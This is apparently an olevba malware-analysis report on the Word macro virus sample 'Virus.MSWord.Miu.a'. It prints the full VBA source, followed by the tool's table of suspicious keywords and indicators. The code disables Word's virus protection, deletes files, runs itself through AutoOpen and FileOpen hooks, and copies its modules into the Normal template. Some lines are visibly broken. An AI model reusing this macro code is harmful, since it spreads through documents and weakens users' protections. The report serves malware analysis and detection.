olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Miu.a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Miu.a 
in file: Virus.MSWord.Miu.a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�����������������������������������������
'Anti-Toraja(c)Copyright2003 - Psychologic
'Anti virus for MacroVirus.WE972000.Toraja
'Created By Psychologic (c) 2003
'Psychologic@hotmail.com
'�����������������������������������������

Sub WantiToraja()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
    CommandBars.ActiveMenuBar.Enabled = True
    CommandBars("Control ToolBox").Enabled = True
    CommandBars("Form").Enabled = True
    CommandBars("ActiveX Control").Enabled = True
    CommandBars("Control ToolBox").Enabled = True
    CommandBars("Visual Basic").Enabled = True
    On Error Resume Next
    Kill "C:\WINDOWS\Application Data\Microsoft\Excel\XLStart\excel2r.xls"
    Kill "C:\Program Files\Microsoft Office\Office\XLStart\excel2r.xls"
    Kill "C:\windows.reg"
    Kill "C:\fix.bat"
    Kill "C:\sex.txt.vbs"

If ActiveDocument.Name = "AntiToraja.doc" Then
A2N
End If

If ActiveDocument.Name <> "AntiToraja.doc" Then
z = 0
p = MsgBox("Checking file : " + ActiveDocument.Name + " ! ", vbInformation, "Psychologic")

On Error Resume Next
For Each obj In ActiveDocument.VBProject.VBComponents
z = z + 1

If obj.Name = "AntiToraja" Or obj.Name = "ThisDocument" Or obj.Name = "UIM2R" Then
GoTo jump
End If

Set mok = ActiveDocument.VBProject.VBComponents.Item(1)
xx = mok.codemodule.CountOfLines
xy = Int(xx / 25) + 1
xyz = 1
p = MsgBox("Code Modules " + obj.Name, vbInformation, "Code module Program")
While x < xy
xadl = mok.codemodule.Lines(xyz, 25)
x = x + 1
xyz = xyz + 25
p = MsgBox(xadl, vbExclamation, "Macro Source code")
Wend

ActiveDocument.VBProject.VBComponents(z).Export "C:\My Documents\" & obj.Name & "m2r.txt"

answer = MsgBox("Clean Data ?", vbYesNo + vbCritical + vbDefaultButton2, "Clean Module")
If answer = vbYes Then
ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents(obj.Name)
End If

jump:
Next obj

On Error Resume Next
For Each obj In NormalTemplate.VBProject.VBComponents
If obj.Name <> "AntiToraja" And obj.Name <> "ThisDocument" And obj.Name <> "UIM2R" Then
p = MsgBox("Clean " + obj.Name + " Macro in Normal Template")

answer = MsgBox("Clean Data ?", vbYesNo + vbCritical + VbDefaulButton2, "Clean Module")

If answer = vbYes Then
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents(objname)
End If
End If
Next obj

PTB

On Error Resume Next
ActiveDocument.Save
NormalTemplate.Save
UIM2R.Show
End If
End Sub

Sub FileOpen()
WordBasic.DisableAutoMacros True
On Error Resume Next
If Dialogs(wdDialogFileOpen).Show <> 0 Then
WantiToraja
End If
WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
WordBasic.DisableAutoMacros True
On Error Resume Next
If ActiveDocument.Name = "AntiToraja.doc" Then
A2N
End If
WantiToraja
WordBasic.DisableAutoMacros False
End Sub

Sub PTB()
Set dok = ActiveDocument.VBProject.VBComponets.Item(1)
Set temp = ActiveDocument.VBProject.VBComponets.Item(1)
Adobat = dok.codemodule.Find("---AntiToraja---", 1, 1, 10000, 10000)
megat = "---AntiToraja--- (c) 2002,2003,Psychologic@hotmail.com"

If Not Adobat Then
    adl = dok.codemodule.Lines(1, dok.codemodule.CountOfLines)
    p = MsgBox(adl, vbInformation, "Cleaning Document")
    dok.codemodule.deleteLines 1, dok.codemodule.CountOfLines
    dok.codemodule.AddFromString megat

    On Error Resume Next
    nt1 = temp.codemodule.Lines(1, temp.codemodule.CounOfLines)
    p = MsgBox(nt1, vbInformation, "Cleaning Normal Temp")
    temp.codemodule.deleteLines 1, temp.codemodule.CountOfLines
    temp.codemodule.AddFromString megat
End If

Sub A2N()
TempPATH = Application.NormalTemplate.Path & Application.PathSeparator
Set sumber = ActiveDocument
Set target = NormalTemplate

sehat = False

For Each obj In target.VBProject.VBComponents
    If obj.Name = "AntiToraja" Then sehat = False
    If (obj.Name <> "ThisDocument") And (obj.Name <> "Reference To Normal") And (obj.Name <> "AntiToraja") Then
        target.VBProject.VBComponents.Remove
        target.VBProject.VBComponents (obj.Name)
    End If
        Next obj
    If sehat = False Then
x = infect(sumber, target, "AntiToraja")
x = infect(sumber, target, "UIM2R")
    End If

End Sub

Function infect(sumber, target, obj As String) As Boolean
On Error GoTo runaway
sumber.VBProject.VBComponents(obj).Export TempPATH & obj
target.VBProject.VBComponents.Import TempPATH & obj
Kill TempPATH & obj
Exit Function
runaway:
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |windows.reg         |Executable file name                         |
|IOC       |fix.bat             |Executable file name                         |
|IOC       |txt.vbs             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

